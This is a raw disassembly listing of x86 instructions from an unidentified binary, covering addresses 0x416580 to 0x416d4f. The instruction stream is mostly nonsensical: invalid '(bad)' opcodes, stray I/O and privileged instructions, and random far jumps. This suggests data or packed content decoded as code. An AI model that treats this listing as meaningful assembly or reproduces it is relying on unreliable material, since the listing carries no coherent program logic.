  416580:	push   eax
  416581:	dec    eax
  416582:	std    
  416583:	push   es
  416584:	in     eax,0xdf
  416586:	cmp    DWORD PTR [eax-0x2],ebx
  416589:	(bad)  
  41658a:	div    ah
  41658c:	xlat   BYTE PTR ds:[ebx]
  41658d:	mov    edx,DWORD PTR [eax-0x45987832]
  416593:	cmp    eax,0x5f12c312
  416598:	call   0x7ede148c
  41659d:	add    DWORD PTR [edx],edx
  41659f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165a0:	aam    0xb6
  4165a2:	iret   
  4165a3:	outs   dx,BYTE PTR ds:[esi]
  4165a4:	das    
  4165a5:	cmc    
  4165a6:	fistp  WORD PTR [esi+0x69706cec]
  4165ac:	cmp    BYTE PTR [ebp-0x23],bl
  4165af:	pop    eax
  4165b0:	sbb    eax,0x43819e50
  4165b5:	dec    ecx
  4165b6:	das    
  4165b7:	cmp    BYTE PTR [esi-0x2c],dl
  4165ba:	pop    ecx
  4165bb:	inc    ecx
  4165bc:	rcr    dh,0x9c
  4165bf:	adc    al,0xdd
  4165c1:	dec    eax
  4165c2:	icebp  
  4165c3:	xor    BYTE PTR [edi-0x4a9816ed],bl
  4165c9:	in     al,dx
  4165ca:	xchg   ebx,eax
  4165cb:	scas   eax,DWORD PTR es:[edi]
  4165cc:	inc    eax
  4165cd:	mov    al,0x98
  4165cf:	dec    ecx
  4165d0:	or     eax,0x8b106751
  4165d5:	fcomp  QWORD PTR [edx+edx*1+0x6c]
  4165d9:	std    
  4165da:	push   ss
  4165db:	loop   0x416650
  4165dd:	sub    al,0x1b
  4165df:	ror    ah,cl
  4165e1:	mov    al,0x0
  4165e3:	retf   
  4165e4:	mov    bh,0xaa
  4165e6:	rol    BYTE PTR [edx-0x22],0xba
  4165ea:	push   ebx
  4165eb:	xor    al,0xec
  4165ed:	popa   
  4165ee:	aas    
  4165ef:	pop    ss
  4165f0:	pop    esp
  4165f1:	inc    edx
  4165f2:	mov    ?,WORD PTR [di]
  4165f5:	sbb    edi,DWORD PTR [ecx]
  4165f7:	push   eax
  4165f8:	push   ecx
  4165f9:	std    
  4165fa:	dec    eax
  4165fb:	inc    ebp
  4165fc:	xchg   edx,eax
  4165fd:	xor    ebx,ecx
  4165ff:	inc    edx
  416600:	es xor al,0x7
  416603:	jo     0x416606
  416605:	addr16 sahf 
  416607:	fwait
  416608:	inc    ebx
  416609:	push   ebx
  41660a:	cmp    ecx,DWORD PTR [edx]
  41660c:	popa   
  41660d:	mov    al,0x20
  41660f:	mov    ds,edx
  416611:	mov    bh,0xa5
  416613:	ficomp DWORD PTR [eax]
  416615:	scas   al,BYTE PTR es:[edi]
  416616:	test   ecx,0x37327632
  41661c:	pop    edi
  41661d:	std    
  41661e:	scas   eax,DWORD PTR es:[edi]
  41661f:	clc    
  416620:	out    0xb0,eax
  416622:	pushf  
  416623:	pop    ss
  416624:	fstp   st(5)
  416626:	fwait
  416627:	push   eax
  416628:	and    dl,bl
  41662a:	cli    
  41662b:	add    ecx,esp
  41662d:	inc    ebx
  41662e:	xor    DWORD PTR [ecx],0xffffffab
  416631:	ror    BYTE PTR [ecx-0x5e151586],0x2
  416638:	loop   0x416658
  41663a:	arpl   WORD PTR [esi+esi*1],sp
  41663d:	inc    esi
  41663e:	js     0x41662f
  416640:	adc    eax,DWORD PTR [esi+0x14bda8f1]
  416646:	int    0x8f
  416648:	fucom  st(1)
  41664a:	inc    ebx
  41664b:	ud0    edi,DWORD PTR [ebp+0x1a]
  41664f:	repnz cmp al,0xb8
  416652:	mov    edx,0x7f10d55b
  416657:	test   al,0xfe
  416659:	or     BYTE PTR [ebp+0x17],cl
  41665c:	push   edi
  41665d:	sub    edi,DWORD PTR [edx-0x1c80230a]
  416663:	and    DWORD PTR [edx+edi*8],ebp
  416666:	icebp  
  416667:	loopne 0x4166a6
  416669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41666a:	pop    edx
  41666b:	lds    ebx,FWORD PTR [eax-0xbe574ea]
  416671:	pop    eax
  416672:	lahf   
  416673:	xchg   edx,eax
  416674:	dec    esp
  416675:	ins    BYTE PTR es:[edi],dx
  416676:	fiadd  DWORD PTR [ebx]
  416678:	stc    
  416679:	and    eax,0xe362820d
  41667e:	mov    WORD PTR [ebp-0x15afc021],?
  416684:	push   cs
  416685:	dec    ecx
  416686:	mov    bh,BYTE PTR ds:0x4f9a58e3
  41668c:	push   ss
  41668d:	sub    edx,DWORD PTR [esi]
  41668f:	xor    esi,DWORD PTR [ebp+ecx*1-0x424785c6]
  416696:	push   0x9d960af9
  41669b:	cld    
  41669c:	sub    ah,BYTE PTR [ecx]
  41669e:	fwait
  41669f:	ret    0x71e6
  4166a2:	and    edi,0x2f
  4166a5:	dec    edi
  4166a6:	or     ebx,DWORD PTR [ecx+0x73]
  4166a9:	push   ecx
  4166aa:	stos   DWORD PTR es:[edi],eax
  4166ab:	sbb    BYTE PTR [edi+ecx*2+0x39],dl
  4166af:	xlat   BYTE PTR ds:[ebx]
  4166b0:	mov    esp,DWORD PTR [ebx+edx*8]
  4166b3:	xor    eax,0x3bcdceb0
  4166b8:	addr16 mov cl,0xb5
  4166bb:	ins    DWORD PTR es:[edi],dx
  4166bc:	jne    0x41670f
  4166be:	pushf  
  4166bf:	sub    eax,0xcaf7fee2
  4166c4:	inc    edi
  4166c5:	push   esp
  4166c6:	out    0xf5,al
  4166c8:	and    dl,BYTE PTR [edi-0x2b]
  4166cb:	or     al,0x38
  4166cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166ce:	iret   
  4166cf:	sbb    DWORD PTR [edi-0x4e7a116e],edx
  4166d5:	cmc    
  4166d6:	ins    BYTE PTR es:[edi],dx
  4166d7:	(bad)  
  4166d8:	dec    al
  4166da:	std    
  4166db:	ss xchg ebp,eax
  4166dd:	push   ebp
  4166de:	lock mov cl,0xc
  4166e1:	jne    0x4166b2
  4166e3:	sub    BYTE PTR [ebx-0x15993d6a],ah
  4166e9:	push   cs
  4166ea:	lock loope 0x4166f6
  4166ed:	into   
  4166ee:	outs   dx,DWORD PTR ds:[esi]
  4166ef:	add    esp,DWORD PTR [ecx+ebx*4+0x79f06a96]
  4166f6:	and    esi,DWORD PTR [ecx]
  4166f8:	mov    edx,0x517dfcbf
  4166fd:	dec    ecx
  4166fe:	xor    eax,0xcd529ddb
  416703:	jg     0x41668e
  416705:	jmp    0x416734
  416707:	inc    esp
  416708:	retf   
  416709:	loope  0x41675a
  41670b:	jmp    0x692d:0x979e89b2
  416712:	bound  bp,DWORD PTR [ebp-0x30]
  416716:	loope  0x41671c
  416718:	or     edx,DWORD PTR [ebp+0x478ea4c]
  41671e:	adc    ebx,DWORD PTR [ecx+eax*8]
  416721:	loope  0x4166c2
  416723:	test   BYTE PTR [ebp+0x62226486],dl
  416729:	jmp    edi
  41672b:	fwait
  41672c:	ret    
  41672d:	es test al,cl
  416730:	push   cs
  416731:	pop    ebx
  416732:	sbb    eax,0x2d9e371d
  416737:	and    al,0x84
  416739:	int    0x35
  41673b:	sahf   
  41673c:	fs push edi
  41673e:	pop    esp
  41673f:	mov    dh,0x1
  416741:	outs   dx,DWORD PTR ds:[esi]
  416742:	dec    ebp
  416743:	sbb    eax,0x779fc4c1
  416748:	mov    ?,WORD PTR [esi+0x29]
  41674b:	mov    al,ah
  41674d:	xchg   esp,eax
  41674e:	xlat   BYTE PTR ds:[ebx]
  41674f:	pusha  
  416750:	pop    esi
  416751:	leave  
  416752:	mov    ecx,0xe27ff068
  416757:	mov    ds:0xb5f7f3dd,al
  41675c:	jle    0x4167ca
  41675e:	xchg   edx,eax
  41675f:	fimul  DWORD PTR [esi+0x0]
  416762:	lock popf 
  416764:	mov    bl,0x6f
  416766:	inc    ebx
  416767:	push   0xd6155f3
  41676c:	pop    eax
  41676d:	jp     0x4167ee
  41676f:	maxps  xmm1,XMMWORD PTR [eax+ebp*1]
  416773:	and    DWORD PTR [eax+0x23],0xffffffdc
  416777:	test   ebp,0x545a7261
  41677d:	ret    
  41677e:	rcl    DWORD PTR [ecx],1
  416780:	adc    ch,ah
  416782:	pop    edx
  416783:	loop   0x416755
  416785:	mov    ds:0xbffec8be,eax
  41678a:	pop    edi
  41678b:	or     BYTE PTR [ebx+0x488eceb4],0xe0
  416792:	mov    ch,0x2b
  416794:	xchg   ecx,eax
  416795:	add    al,0xe1
  416797:	in     al,0x1
  416799:	jno    0x41671e
  41679b:	inc    edx
  41679c:	jno    0x4167a7
  41679e:	mov    esi,0x7a1880b6
  4167a3:	cmp    BYTE PTR [esi],dl
  4167a5:	loope  0x416819
  4167a7:	sub    al,0x4b
  4167a9:	inc    esp
  4167aa:	mov    edi,0x7356ddab
  4167af:	mov    edx,0x822af2c3
  4167b4:	aaa    
  4167b5:	cmp    al,0xf6
  4167b7:	pop    ss
  4167b8:	mov    edi,0x768b23e
  4167bd:	rol    BYTE PTR [ecx+0x17ff3870],1
  4167c3:	call   0x425c:0xa66378c5
  4167ca:	mov    edi,0xce1045b8
  4167cf:	sete   BYTE PTR [ebx-0x7d3bd589]
  4167d6:	sub    bh,al
  4167d8:	and    edi,DWORD PTR [edx+0x1d009f0c]
  4167de:	cmp    DWORD PTR [ecx-0x7ba0c60],0x3f
  4167e5:	jge    0x416792
  4167e7:	les    edx,FWORD PTR [ebx-0x528e17b6]
  4167ed:	in     eax,0x8d
  4167ef:	jmp    0x41682d
  4167f1:	inc    esp
  4167f2:	retf   
  4167f3:	clc    
  4167f4:	cmp    eax,0xb0f621b6
  4167f9:	sub    cl,BYTE PTR [esi-0x202833f8]
  4167ff:	out    dx,eax
  416800:	ds or  eax,0x3a1b3a29
  416806:	mov    ss,esi
  416808:	push   esi
  416809:	imul   ebp,DWORD PTR [esi],0x84bd5242
  41680f:	mov    esi,0xabfcefa4
  416814:	push   ecx
  416815:	xor    esp,edx
  416817:	out    dx,al
  416818:	sbb    BYTE PTR [esi+ebp*1+0x1245536c],al
  41681f:	es pop edx
  416821:	mov    dh,0x78
  416823:	nop
  416824:	rcl    esi,cl
  416826:	fcom   DWORD PTR [ebx-0x3e]
  416829:	icebp  
  41682a:	neg    BYTE PTR [esi-0x7ce36b85]
  416830:	dec    ecx
  416831:	mov    dl,0xb2
  416833:	mov    ecx,0xe5e01e28
  416838:	hlt    
  416839:	shr    BYTE PTR ds:0xb5b5212c,0xad
  416840:	adc    BYTE PTR [esi-0x46],dl
  416843:	sbb    eax,0xe92475fb
  416848:	xchg   esi,eax
  416849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41684a:	add    dh,BYTE PTR [esi-0x1f1c3096]
  416850:	iret   
  416851:	retf   0xe288
  416854:	xchg   edx,eax
  416855:	cmp    al,0xbf
  416857:	jg     0x4168d5
  416859:	loope  0x416815
  41685b:	test   BYTE PTR [ebp-0x15c8ca60],dl
  416861:	lock dec eax
  416863:	cmp    edi,ecx
  416865:	lods   al,BYTE PTR ds:[esi]
  416866:	sub    BYTE PTR [edx+0x3825123],ch
  41686c:	pusha  
  41686d:	add    al,0x2d
  41686f:	loop   0x41684d
  416871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416872:	mov    bl,0x30
  416874:	hlt    
  416875:	out    dx,eax
  416876:	mov    al,ds:0xd9daa0dd
  41687b:	mov    bl,0x37
  41687d:	aam    0x77
  41687f:	mov    al,0xd5
  416881:	test   al,0xe
  416883:	sub    eax,0x49b53709
  416888:	xchg   ebx,eax
  416889:	sub    BYTE PTR [ebx+esi*4+0x2],dl
  41688d:	ret    0x7484
  416890:	xchg   ebp,eax
  416891:	jb     0x41683c
  416893:	adc    BYTE PTR [edi],dh
  416895:	pop    sp
  416897:	and    al,0x9a
  416899:	mov    bl,ah
  41689b:	call   0x1737d91b
  4168a0:	and    BYTE PTR [ebx+0x123656ea],ah
  4168a6:	xchg   edx,eax
  4168a7:	xor    dh,BYTE PTR [eax-0x2fb4ef0e]
  4168ad:	jp     0x416895
  4168af:	test   al,0xe8
  4168b1:	(bad)  
  4168b2:	pop    eax
  4168b3:	gs scas eax,DWORD PTR es:[edi]
  4168b5:	js     0x4168bc
  4168b7:	lahf   
  4168b8:	gs cmc 
  4168ba:	fwait
  4168bb:	pop    es
  4168bc:	ror    DWORD PTR [edi],cl
  4168be:	cld    
  4168bf:	lods   eax,DWORD PTR ds:[esi]
  4168c0:	imul   ebx,DWORD PTR [edi],0x32
  4168c3:	xchg   ecx,eax
  4168c4:	sub    al,0x90
  4168c6:	hlt    
  4168c7:	inc    esp
  4168c8:	sbb    al,0x68
  4168ca:	and    DWORD PTR ds:0xec06a686,ecx
  4168d0:	adc    edx,DWORD PTR ds:[edx+0x2e]
  4168d4:	or     DWORD PTR [ecx+0x6cd7e98d],ebx
  4168da:	test   eax,0x82d6720e
  4168df:	mov    al,0x87
  4168e1:	shl    DWORD PTR [edi],0x7b
  4168e4:	or     edx,eax
  4168e6:	mov    al,ds:0x4db62c0
  4168eb:	popa   
  4168ec:	and    ah,BYTE PTR [ebx+0xbf01bac]
  4168f2:	mov    esi,0x38fdf617
  4168f8:	xchg   edx,eax
  4168f9:	ror    BYTE PTR [edi+0x3d5fb448],0xc6
  416900:	jl     0x4168ff
  416902:	nop
  416903:	cmp    DWORD PTR [edi],ecx
  416905:	adc    al,0x2e
  416907:	or     edx,DWORD PTR [esi]
  416909:	mov    ecx,0x2b4dabfe
  41690e:	fcomp  DWORD PTR [eax]
  416910:	test   ch,cl
  416912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416914:	mov    ds:0x3f6d30ef,eax
  416919:	(bad)  
  41691a:	pop    edx
  41691b:	jg     0x4168fc
  41691d:	pushf  
  41691e:	pop    esp
  41691f:	xchg   edi,edi
  416921:	shl    BYTE PTR [edx+ebx*8],0x24
  416925:	out    0xe1,al
  416927:	dec    ecx
  416928:	adc    bl,BYTE PTR [edx]
  41692a:	push   cs
  41692b:	and    BYTE PTR [edi+0x61d6140d],bl
  416931:	repnz pushf 
  416933:	sbb    al,0x3b
  416935:	xchg   ecx,eax
  416936:	sub    BYTE PTR [eax+eiz*4-0x43],ah
  41693a:	xor    esi,0xea2263ce
  416940:	bound  eax,QWORD PTR [ebx-0x50]
  416943:	jno    0x41699b
  416945:	(bad)  [esi-0x9]
  416948:	cld    
  416949:	(bad)
  41694d:	sbb    al,0x64
  41694f:	mov    edx,0xbd8e3dcc
  416954:	loop   0x416920
  416956:	push   eax
  416957:	or     al,0xc9
  416959:	popf   
  41695a:	aas    
  41695b:	or     BYTE PTR [edx],al
  41695d:	call   0x8078:0x4979aec4
  416964:	daa    
  416965:	adc    al,0x7b
  416967:	pop    ebp
  416968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416969:	jecxz  0x416917
  41696b:	mov    edi,0xaf706b03
  416970:	mov    eax,0x4b9e6a82
  416975:	loope  0x4169e3
  416977:	jle    0x4169b3
  416979:	adc    al,0xd7
  41697b:	mov    dh,BYTE PTR [ebx+0x58]
  41697e:	jle    0x416939
  416980:	mov    ds:0xc2e08d5f,eax
  416985:	clc    
  416986:	xchg   ecx,eax
  416987:	sub    bh,0xc6
  41698a:	ss cmp edi,ebx
  41698d:	mov    esi,0xa0e1318c
  416992:	out    dx,eax
  416993:	inc    edi
  416994:	xchg   ecx,eax
  416995:	adc    al,0x5c
  416997:	ss ret 0xdccb
  41699b:	fst    DWORD PTR ds:0xabafe14
  4169a1:	dec    esi
  4169a2:	adc    edx,DWORD PTR [ebx+0x10]
  4169a5:	in     al,dx
  4169a6:	test   al,0x94
  4169a8:	mov    bl,0xb
  4169aa:	cmp    al,dl
  4169ac:	xlat   BYTE PTR ds:[ebx]
  4169ad:	pop    ebx
  4169ae:	out    dx,al
  4169af:	inc    ebp
  4169b0:	mov    ecx,0x36095464
  4169b5:	(bad)  
  4169b6:	aad    0x10
  4169b8:	scas   al,BYTE PTR es:[edi]
  4169b9:	dec    ebp
  4169ba:	je     0x4169a0
  4169bc:	xchg   edx,eax
  4169bd:	jno    0x416a31
  4169bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169c0:	sub    eax,0x119d81f0
  4169c5:	mov    dl,0x8d
  4169c7:	and    eax,0xe0084d73
  4169cc:	xchg   esp,eax
  4169cd:	inc    edi
  4169ce:	shr    dl,0x3f
  4169d1:	or     ebp,DWORD PTR [eax+0x56]
  4169d4:	add    eax,0x923a76b0
  4169d9:	es xor al,0xa2
  4169dc:	dec    esi
  4169dd:	jle    0x416a33
  4169df:	mov    bl,BYTE PTR [ebx+0x64]
  4169e2:	std    
  4169e3:	cmp    al,0xd7
  4169e5:	inc    eax
  4169e6:	mov    edi,0x19380328
  4169eb:	jno    0x416981
  4169ed:	add    BYTE PTR [esi],0xb3
  4169f0:	mov    edi,0xf008e3e7
  4169f5:	sub    ebx,edx
  4169f7:	nop
  4169f8:	mov    al,ds:0x8f558752
  4169fd:	dec    esi
  4169fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169ff:	sbb    dh,BYTE PTR [edi+0x34888676]
  416a05:	dec    esi
  416a06:	sbb    eax,0x4185b1ce
  416a0b:	inc    ecx
  416a0c:	loopne 0x416a00
  416a0e:	sbb    BYTE PTR cs:[edx+0x6f4033f5],bh
  416a15:	out    dx,al
  416a16:	fsin   
  416a18:	dec    ecx
  416a19:	(bad)  
  416a1a:	in     al,0x7e
  416a1c:	xor    eax,0x1bb0cfcc
  416a21:	(bad)  
  416a22:	push   edi
  416a23:	imul   ch
  416a25:	test   DWORD PTR ds:0xa61fc8dd,edx
  416a2b:	xchg   esi,eax
  416a2c:	push   cs
  416a2d:	adc    DWORD PTR [ecx],edx
  416a2f:	stc    
  416a30:	mov    ebp,0x580a6136
  416a35:	mov    ebx,0x8f68faa3
  416a3a:	xor    eax,0x2e
  416a3d:	add    eax,DWORD PTR [esi+edx*4+0x52]
  416a41:	cmp    edi,edx
  416a43:	icebp  
  416a44:	or     al,0x40
  416a46:	mov    dl,BYTE PTR [esi]
  416a48:	mov    al,0x8c
  416a4a:	lea    edx,[edi]
  416a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a4d:	or     al,0x8e
  416a4f:	sbb    al,0x93
  416a51:	xchg   esp,eax
  416a52:	push   esi
  416a53:	pop    edx
  416a54:	push   0xffffffb9
  416a56:	adc    DWORD PTR [eax-0x52ce2a0d],esp
  416a5c:	aad    0x11
  416a5e:	jecxz  0x416a35
  416a60:	push   cs
  416a61:	arpl   WORD PTR [edi],cx
  416a63:	jp     0x416a91
  416a65:	ret    0x5cc3
  416a68:	and    esp,DWORD PTR [ebx-0x262f6b4b]
  416a6e:	(bad)  
  416a6f:	data16 jnp 0x416a9d
  416a72:	xchg   edx,eax
  416a73:	jno    0x416ab7
  416a75:	into   
  416a76:	adc    DWORD PTR ds:0x5dcf4711,edx
  416a7c:	mov    ch,0x84
  416a7e:	pushf  
  416a7f:	iret   
  416a80:	fsub   st,st(4)
  416a82:	adc    ebp,DWORD PTR [eax]
  416a84:	inc    edx
  416a85:	mov    ah,0xc
  416a87:	loop   0x416a53
  416a89:	int3   
  416a8a:	popf   
  416a8b:	sbb    BYTE PTR [edx+0x77dc8997],0x6c
  416a92:	cdq    
  416a93:	lods   al,BYTE PTR ds:[esi]
  416a94:	jecxz  0x416a99
  416a96:	mov    ebp,0x57d129d2
  416a9b:	fdivr  QWORD PTR [ebx+0x5]
  416a9e:	inc    edx
  416a9f:	call   FWORD PTR [ecx+0x73]
  416aa2:	jnp    0x416b18
  416aa4:	retf   
  416aa5:	mov    ebx,0xf673bcee
  416aaa:	test   eax,0xafbe98fb
  416aaf:	xor    eax,0xce070c3a
  416ab4:	inc    ecx
  416ab5:	es (bad) 
  416ab7:	fld    QWORD PTR [edi-0x979512d]
  416abd:	mov    edi,0xa1f7c2af
  416ac2:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  416ac4:	push   edi
  416ac5:	and    cl,BYTE PTR [edi]
  416ac7:	inc    esi
  416ac8:	(bad)  
  416ac9:	jno    0x416aa8
  416acb:	xchg   ebx,eax
  416acc:	xchg   bh,dl
  416ace:	mov    BYTE PTR [esi-0xe],ch
  416ad1:	cs jecxz 0x416b53
  416ad4:	stos   DWORD PTR es:[edi],eax
  416ad5:	int3   
  416ad6:	scas   eax,DWORD PTR es:[edi]
  416ad7:	fnstcw WORD PTR [ecx-0x70a08211]
  416add:	iret   
  416ade:	sbb    eax,0x370eae9f
  416ae3:	mov    ch,0xfe
  416ae5:	shl    DWORD PTR [eax+0x47],1
  416ae8:	pop    edi
  416ae9:	xchg   BYTE PTR [ebx+ecx*8+0x12],ch
  416aed:	stos   BYTE PTR es:[edi],al
  416aee:	ret    
  416aef:	imul   ebx,DWORD PTR [ecx],0xfbeb2b56
  416af5:	inc    edx
  416af6:	jg     0x416af1
  416af8:	xchg   BYTE PTR [eax+0x75],al
  416afb:	jl     0x416b52
  416afd:	bound  esi,QWORD PTR [edi-0x59b0a688]
  416b03:	mov    esp,0xed1aa468
  416b08:	mov    ah,0x95
  416b0a:	popf   
  416b0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b0c:	jecxz  0x416b20
  416b0e:	setb   BYTE PTR fs:[edx+0x1e7f380]
  416b16:	dec    edi
  416b17:	sar    BYTE PTR [edx-0x53818171],1
  416b1d:	rol    BYTE PTR [eax-0x623273a1],0xb2
  416b24:	pop    edi
  416b25:	ror    BYTE PTR [edx+0x4],1
  416b28:	(bad)  
  416b29:	mov    BYTE PTR [edx-0x3],bh
  416b2c:	dec    BYTE PTR [edx-0x64]
  416b2f:	lahf   
  416b30:	movd   DWORD PTR [edx+eax*4],mm7
  416b34:	and    BYTE PTR [eax-0x67],ch
  416b37:	sub    edx,DWORD PTR [ecx]
  416b39:	lock aam 0x99
  416b3c:	and    ebp,DWORD PTR [ebp+0x40b43726]
  416b42:	leave  
  416b43:	push   0xbb3e27ff
  416b48:	in     al,dx
  416b49:	fadd   DWORD PTR [eax]
  416b4b:	jo     0x416b87
  416b4d:	inc    edx
  416b4e:	inc    ecx
  416b4f:	xor    DWORD PTR [ebp-0x4d],0x6aa8d3c2
  416b56:	sahf   
  416b57:	add    DWORD PTR [edi-0x4b13aa1e],edi
  416b5d:	jmp    0x416b84
  416b5f:	cmc    
  416b60:	xchg   esp,eax
  416b61:	push   0x24
  416b63:	arpl   ax,sp
  416b65:	dec    esi
  416b66:	sub    BYTE PTR [ebp+0x5f6d8b4b],al
  416b6c:	xchg   edi,eax
  416b6d:	xchg   edx,eax
  416b6e:	js     0x416af6
  416b70:	cmp    edi,DWORD PTR [ebx-0x15]
  416b73:	mov    eax,ds:0x6eb3567
  416b78:	repz enter 0xf7a1,0x39
  416b7d:	or     DWORD PTR [eax],0x40
  416b80:	(bad)  
  416b81:	xchg   edi,eax
  416b82:	mov    ch,0x1
  416b84:	in     al,0xd8
  416b86:	fnstenv [edi-0x51]
  416b89:	add    eax,0x3989b50c
  416b8e:	pop    ebx
  416b8f:	test   DWORD PTR [ebp-0xf5d42f7],ebx
  416b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b96:	and    eax,0xbe129f5e
  416b9b:	lods   al,BYTE PTR ds:[esi]
  416b9c:	sub    DWORD PTR [esi-0x32],esp
  416b9f:	add    eax,0xb7d2dad8
  416ba4:	clc    
  416ba5:	bound  ebx,QWORD PTR [ebp-0x3]
  416ba8:	iret   
  416ba9:	pop    ds
  416baa:	mov    al,ds:0x5121c94a
  416baf:	stc    
  416bb0:	mov    ah,0x41
  416bb2:	adc    al,0x4e
  416bb4:	loop   0x416bdb
  416bb6:	sub    eax,0x683f002c
  416bbb:	mov    BYTE PTR [edi],bl
  416bbd:	adc    dl,al
  416bbf:	sbb    eax,0xe23d1a2d
  416bc4:	jmp    0xf792:0xaca93968
  416bcb:	dec    ebp
  416bcc:	fild   DWORD PTR [ebx+0x6d42b8af]
  416bd2:	push   edi
  416bd3:	(bad)
  416bd7:	int    0xe0
  416bd9:	pop    ss
  416bda:	lea    esi,[ecx+0x15784ba7]
  416be0:	not    ebp
  416be2:	push   edi
  416be3:	shr    ah,0x1d
  416be6:	retf   
  416be7:	cld    
  416be8:	sub    cl,BYTE PTR [edx+0x21]
  416beb:	lahf   
  416bec:	xchg   ebx,eax
  416bed:	test   eax,0xaccb5d4
  416bf2:	ins    DWORD PTR es:[edi],dx
  416bf3:	test   eax,0x4738bb98
  416bf8:	xchg   ecx,eax
  416bf9:	or     BYTE PTR [ebx+0x633fea38],0xd4
  416c00:	test   bl,ah
  416c02:	adc    DWORD PTR [ecx+0x2fdbac79],0xd0f9cf5f
  416c0c:	ins    DWORD PTR es:[edi],dx
  416c0d:	mov    eax,0x536a6c74
  416c12:	cwde   
  416c13:	mov    WORD PTR [eax],?
  416c15:	cmp    eax,0xafd1eb86
  416c1a:	pop    ss
  416c1b:	jmp    0x763bdca2
  416c20:	xor    ah,BYTE PTR [edx-0x7e]
  416c23:	lahf   
  416c24:	add    DWORD PTR [edx],edi
  416c26:	inc    edx
  416c27:	cmp    esi,esp
  416c29:	or     eax,0xd6d33099
  416c2e:	pop    ds
  416c2f:	scas   eax,DWORD PTR es:[edi]
  416c30:	jns    0x416c9a
  416c32:	repnz shr BYTE PTR [edi],1
  416c35:	push   edx
  416c36:	pop    ebp
  416c37:	rol    ecx,1
  416c39:	stos   DWORD PTR es:[edi],eax
  416c3a:	push   0xfffffff8
  416c3c:	outs   dx,DWORD PTR ds:[esi]
  416c3d:	out    0xd3,eax
  416c3f:	sti    
  416c40:	jecxz  0x416c4f
  416c42:	jle    0x416c9d
  416c44:	xchg   bl,bh
  416c46:	cmp    al,0xae
  416c48:	adc    al,0x55
  416c4a:	pop    ebp
  416c4b:	sbb    bl,ch
  416c4d:	loopne 0x416bde
  416c4f:	dec    ecx
  416c50:	retf   0xbe82
  416c53:	jmp    0x416c36
  416c55:	pop    ebx
  416c56:	adc    eax,0x1ae19edb
  416c5b:	cli    
  416c5c:	sbb    BYTE PTR [eax-0x22],cl
  416c5f:	lods   al,BYTE PTR ds:[esi]
  416c60:	mov    BYTE PTR [edi-0x54],bh
  416c63:	xchg   BYTE PTR [ebx+0x6c],al
  416c66:	sbb    al,bl
  416c68:	push   0x19eb733a
  416c6d:	dec    edx
  416c6e:	loope  0x416cc4
  416c70:	pop    edi
  416c71:	fdiv   st,st(2)
  416c73:	xchg   esi,eax
  416c74:	(bad)  
  416c75:	sub    al,0x93
  416c77:	mov    al,ds:0x89d8d917
  416c7c:	ds scas al,BYTE PTR es:[edi]
  416c7e:	mov    WORD PTR [ebx+0xbd18fc9],ss
  416c84:	jno    0x416c6d
  416c86:	les    edx,FWORD PTR [ebx-0x48d45494]
  416c8c:	mov    dl,0xf2
  416c8e:	push   es
  416c8f:	dec    edi
  416c90:	in     al,dx
  416c91:	inc    edi
  416c92:	je     0x416d13
  416c94:	out    dx,eax
  416c95:	shr    BYTE PTR [ebx+0x3a],1
  416c98:	add    esp,edx
  416c9a:	mov    esp,0x6c60db3e
  416c9f:	pop    ss
  416ca0:	(bad)  
  416ca2:	add    BYTE PTR [ebx],0x23
  416ca5:	lds    ecx,FWORD PTR [edi-0x4a19c5aa]
  416cab:	xchg   ecx,eax
  416cac:	dec    edi
  416cad:	sti    
  416cae:	xor    al,0x33
  416cb1:	clc    
  416cb2:	fld    QWORD PTR [edx+0x4ffe85f2]
  416cb8:	mov    eax,ds:0xd884189
  416cbd:	pop    esi
  416cbe:	test   eax,0xb1b08a2d
  416cc3:	mov    DWORD PTR ss:[ecx+ebp*1],edx
  416cc7:	add    al,0x83
  416cc9:	jns    0x416cf3
  416ccb:	sbb    eax,0x1ca66123
  416cd0:	idiv   DWORD PTR [edi]
  416cd2:	cld    
  416cd3:	mov    ch,BYTE PTR [edi]
  416cd5:	lea    esi,[ebx-0x50]
  416cd8:	arpl   WORD PTR [eax],ax
  416cda:	(bad)  [eax+0x4e]
  416cdd:	ins    DWORD PTR es:[edi],dx
  416cde:	cmp    ch,ch
  416ce0:	and    al,0xc2
  416ce2:	push   cs
  416ce3:	shl    BYTE PTR [edx+0x715b69c],0x2e
  416cea:	add    edx,DWORD PTR [eax+ecx*8-0x54]
  416cee:	push   eax
  416cef:	aas    
  416cf0:	mov    ebp,ebx
  416cf2:	or     DWORD PTR [edi-0x2bcf3f33],edi
  416cf8:	fadd   DWORD PTR [edx+0x4f]
  416cfb:	scas   al,BYTE PTR es:[edi]
  416cfc:	xlat   BYTE PTR ds:[ebx]
  416cfd:	dec    edx
  416cfe:	pop    ebx
  416cff:	sbb    bl,BYTE PTR [eax+0x206ca4c4]
  416d05:	imul   esi,DWORD PTR [edx],0x1a26b9fe
  416d0b:	call   0x26a2:0x3ede634a
  416d12:	stc    
  416d13:	or     BYTE PTR [esp+ebp*2+0x4ad05598],0xb1
  416d1b:	and    ch,BYTE PTR [ebp+0x75]
  416d1e:	repnz cmp edx,ebx
  416d21:	sahf   
  416d22:	mov    eax,0x9fff157d
  416d27:	(bad)  
  416d28:	gs out dx,al
  416d2a:	mov    ecx,0xaefaa462
  416d2f:	imul   edi,ecx,0x7090849d
  416d35:	pop    ebx
  416d36:	repnz mov BYTE PTR [ebx-0x6e],al
  416d3a:	ror    DWORD PTR [ebx-0x72],cl
  416d3d:	mov    ds:0x45cddb04,al
  416d42:	sbb    edi,edx
  416d44:	test   eax,0x7e58c5c3
  416d49:	(bad)  
  416d4a:	xor    dl,BYTE PTR [eax]
  416d4c:	fwait
  416d4d:	inc    BYTE PTR [edi]
  416d4f:	(bad)  
